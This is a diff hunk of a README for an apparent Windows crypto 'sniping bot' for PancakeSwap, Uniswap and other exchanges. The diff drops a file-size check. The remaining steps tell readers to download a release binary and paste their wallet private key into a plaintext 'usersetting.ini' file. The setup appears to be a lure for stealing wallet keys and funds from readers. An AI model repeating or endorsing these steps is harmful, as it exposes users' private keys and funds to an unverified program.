@@ -8,7 +8,7 @@ Full version sniping bot used to snipe during fair coin launches. With advanced 
 
 <H2>Getting started</H2>
 
-1. Download the latest release from <a href="https://github.com/JesusCrypto/windows-full-SNIPEBOT-Pancakeswap-Uniswap-Pangolin-Polygon-Bakeryswap/releases">here</a>. ```(verify that the downloaded file has a size of around 60mb, otherwise your downloaded file will be corrupt)```
+1. Download the latest release from <a href="https://github.com/JesusCrypto/windows-full-SNIPEBOT-Pancakeswap-Uniswap-Pangolin-Polygon-Bakeryswap/releases">here</a>.
 2. Open "usersetting.ini" (with notepad for instance) and add your wallet address and private key in the corresponding fields after the equal (=). 
 <pre>address=0x0000000000000000000000000000000000000000
 privatekey=00000000000000000000000000000000000000000000000000</pre>
